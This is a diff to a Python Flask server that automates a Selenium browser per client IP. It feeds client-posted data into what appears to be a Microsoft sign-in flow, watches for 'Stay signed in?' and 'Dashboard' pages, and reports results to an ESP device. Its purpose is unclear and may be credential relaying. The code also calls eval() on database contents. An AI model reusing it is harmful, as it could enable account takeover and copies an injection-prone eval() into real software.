@@ -8,7 +8,7 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from flask import Flask, request, render_template, send_file, g, jsonify
 from PIL import Image
-#from waitress import serve
+from waitress import serve
 import numpy as np
 import threading
 import time
@@ -296,11 +296,17 @@ def selenium(IP):
                         data_received=read_db(IP)[4]
                     if rep>20000:
                         break
-                    if driver.title=="Teams and Channels | Microsoft Teams" or driver.title=="Dashboard":
+                    if driver.title=="Dashboard":
                         break
+                    for element in driver.find_elements(By.CLASS_NAME, "row text-title"):
+                        if element.text=="Stay signed in?":
+                            break
                     time.sleep(1)
-            if driver.title=="Teams and Channels | Microsoft Teams" or driver.title=="Dashboard":
+            if driver.title=="Dashboard":
                 break
+            for element in driver.find_elements(By.CLASS_NAME, "row text-title"):
+                if element.text=="Stay signed in?":
+                    break
             if rep>20000:
                 break 
             with app.app_context():
@@ -399,19 +405,18 @@ def selenium(IP):
                                 nothing="nothing"
                         if(eval(read_db(IP)[8])!=olddata):
                             break
-        if driver.current_url==url or driver.title=="Dashboard":
-            with app.app_context():
-                sendESP(action_list, IP)
-                db=get_db()
-                cursor=db.cursor()
-                done=False
-                while not done:
-                    try:
-                        cursor.execute("UPDATE al SET DATA_RECEIVED = ? WHERE IP = ?", ("done", IP))
-                        db.commit()
-                        done=True
-                    except:
-                        nothing="nothing"
+        with app.app_context():
+            sendESP(action_list, IP)
+            db=get_db()
+            cursor=db.cursor()
+            done=False
+            while not done:
+                try:
+                    cursor.execute("UPDATE al SET DATA_RECEIVED = ? WHERE IP = ?", ("done", IP))
+                    db.commit()
+                    done=True
+                except:
+                    nothing="nothing"
     except Exception as e:  
         print(e)
 @app.route('/receive', methods=['POST'])
@@ -510,6 +515,6 @@ def UserGenerate():
        return send_file('images/success.PNG')      
 
 if __name__ == '__main__':
-    #serve(app,host = '0.0.0.0',port = 5000)
+    serve(app,host = '0.0.0.0',port = 5000)
     #app.run(host='0.0.0.0')
-    app.run(debug=True,host='0.0.0.0')
+    #app.run(debug=True,host='0.0.0.0')
